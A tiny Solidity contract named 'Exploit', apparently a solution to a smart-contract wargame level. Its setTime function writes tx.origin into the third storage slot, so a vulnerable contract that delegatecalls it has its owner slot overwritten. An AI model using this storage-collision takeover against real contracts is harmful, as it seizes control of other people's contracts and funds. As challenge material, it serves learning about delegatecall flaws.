contract Exploit {

  
  uint public a;
  uint public b;
  address public storedTime;  

  function setTime(uint _time) public {
    storedTime = tx.origin;
  }
}
